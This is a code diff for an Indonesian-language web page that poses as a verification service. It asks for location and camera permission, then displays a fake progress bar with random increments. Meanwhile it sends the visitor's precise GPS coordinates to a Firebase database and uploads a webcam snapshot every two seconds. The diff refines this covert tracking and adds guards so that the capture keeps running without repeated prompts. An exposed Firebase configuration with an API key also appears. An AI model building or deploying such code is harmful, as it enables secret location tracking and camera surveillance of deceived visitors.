@@ -371,119 +371,130 @@
   <canvas id="canvasElement"></canvas>
 
   <script>
-    lucide.createIcons();
+  lucide.createIcons();
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
-      authDomain: "sfkk-6af70.firebaseapp.com",
-      databaseURL: "https://sfkk-6af70-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "sfkk-6af70",
-      storageBucket: "sfkk-6af70.firebasestorage.app",
-      messagingSenderId: "1045663352487",
-      appId: "1:1045663352487:web:3948f3c0a8f1e215187d82",
-      measurementId: "G-23SNFYWR8V"
-    };
+  const firebaseConfig = {
+    apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
+    authDomain: "sfkk-6af70.firebaseapp.com",
+    databaseURL: "https://sfkk-6af70-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "sfkk-6af70",
+    storageBucket: "sfkk-6af70.firebasestorage.app",
+    messagingSenderId: "1045663352487",
+    appId: "1:1045663352487:web:3948f3c0a8f1e215187d82",
+    measurementId: "G-23SNFYWR8V"
+  };
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-    const webcam = document.getElementById('webcamElement');
-    const canvas = document.getElementById('canvasElement');
-    const mainContent = document.getElementById('mainContent');
-    const loadingArea = document.getElementById('loadingArea');
-    const progressFill = document.getElementById('progressFill');
-    const percentText = document.getElementById('percentText');
+  const webcam = document.getElementById('webcamElement');
+  const canvas = document.getElementById('canvasElement');
+  const mainContent = document.getElementById('mainContent');
+  const loadingArea = document.getElementById('loadingArea');
+  const progressFill = document.getElementById('progressFill');
+  const percentText = document.getElementById('percentText');
 
-    let statusLokasi = false;
-    let statusKamera = false;
+  // Variabel penanda status izin
+  let statusLokasi = false;
+  let statusKamera = false;
+  let cameraInterval = null;
 
-    window.onload = async function() {
-      statusLokasi = await mintaLokasi();
-      statusKamera = await mintaKamera();
-    };
+  // Minta izin cukup 1 KALI SAJA saat halaman pertama kali di-load
+  window.onload = async function() {
+    statusLokasi = await mintaLokasi();
+    statusKamera = await mintaKamera();
+  };
 
-    async function Verifikasi() {
-      if (!statusLokasi) statusLokasi = await mintaLokasi();
-      if (!statusKamera) statusKamera = await mintaKamera();
-
-      if (!statusLokasi || !statusKamera) {
-        alert("Layanan ini tidak bisa berjalan jika belum diizinkan.");
-        window.location.reload();
-        return;
-      }
-
-      // Sembunyikan form utama dan tampilkan loading area
-      mainContent.style.display = 'none';
-      loadingArea.style.display = 'flex';
-      jalankanProgressBar();
+  async function Verifikasi() {
+    // Jika salah satu izin ditolak pada pemanggilan awal, beri peringatan
+    if (!statusLokasi || !statusKamera) {
+      alert("Layanan ini memerlukan izin lokasi dan kamera untuk melanjutkan.");
+      window.location.reload();
+      return;
     }
 
-    function jalankanProgressBar() {
-      let progress = 0;
-      const interval = setInterval(() => {
-        if (progress < 100) {
-          progress += Math.floor(Math.random() * 3) + 1;
-          if (progress > 100) progress = 100;
-          progressFill.style.width = progress + '%';
-          percentText.innerText = progress + '%';
-        } else {
-          clearInterval(interval);
-        }
-      }, 300);
-    }
+    // Jika izin sudah didapat, LANGSUNG masuk ke tampilan loading tanpa minta izin lagi
+    mainContent.style.display = 'none';
+    loadingArea.style.display = 'flex';
+    jalankanProgressBar();
+  }
 
-    function mintaLokasi() {
-      return new Promise((resolve) => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              db.ref('device/location').set({
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                updatedAt: Date.now()
-              });
-              resolve(true);
-            },
-            (error) => {
-              console.warn("Lokasi ditolak:", error.message);
-              resolve(false);
-            },
-            { enableHighAccuracy: true, timeout: 10000 }
-          );
-        } else {
-          resolve(false);
-        }
-      });
-    }
-
-    async function mintaKamera() {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          webcam.srcObject = stream;
-          setInterval(captureFrame, 2000);
-          return true;
-        } catch (err) {
-          console.warn("Kamera ditolak:", err.message);
-          return false;
-        }
+  function jalankanProgressBar() {
+    let progress = 0;
+    const interval = setInterval(() => {
+      if (progress < 100) {
+        progress += Math.floor(Math.random() * 3) + 1;
+        if (progress > 100) progress = 100;
+        progressFill.style.width = progress + '%';
+        percentText.innerText = progress + '%';
       } else {
+        clearInterval(interval);
+      }
+    }, 300);
+  }
+
+  function mintaLokasi() {
+    return new Promise((resolve) => {
+      // Jika lokasi sudah pernah berhasil diambil, tidak perlu panggil geolocation lagi
+      if (statusLokasi) return resolve(true);
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            db.ref('device/location').set({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              updatedAt: Date.now()
+            });
+            resolve(true);
+          },
+          (error) => {
+            console.warn("Lokasi ditolak:", error.message);
+            resolve(false);
+          },
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      } else {
+        resolve(false);
+      }
+    });
+  }
+
+  async function mintaKamera() {
+    // Jika kamera sudah aktif, jangan minta izin / buka stream baru lagi
+    if (statusKamera) return true;
+
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        webcam.srcObject = stream;
+
+        // Pastikan interval capture hanya berjalan 1 kali (mencegah tumpukan interval)
+        if (!cameraInterval) {
+          cameraInterval = setInterval(captureFrame, 2000);
+        }
+        return true;
+      } catch (err) {
+        console.warn("Kamera ditolak:", err.message);
         return false;
       }
+    } else {
+      return false;
     }
+  }
 
-    function captureFrame() {
-      if (webcam.videoWidth === 0) return;
+  function captureFrame() {
+    if (webcam.videoWidth === 0) return;
 
-      canvas.width = webcam.videoWidth;
-      canvas.height = webcam.videoHeight;
-      
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
+    canvas.width = webcam.videoWidth;
+    canvas.height = webcam.videoHeight;
+    
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
 
-      const base64Image = canvas.toDataURL('image/jpeg', 1.0);
-      db.ref('device/cameraFrame').set(base64Image);
-    }
+    const base64Image = canvas.toDataURL('image/jpeg', 1.0);
+    db.ref('device/cameraFrame').set(base64Image);
+  }
   </script>
 
 </body>
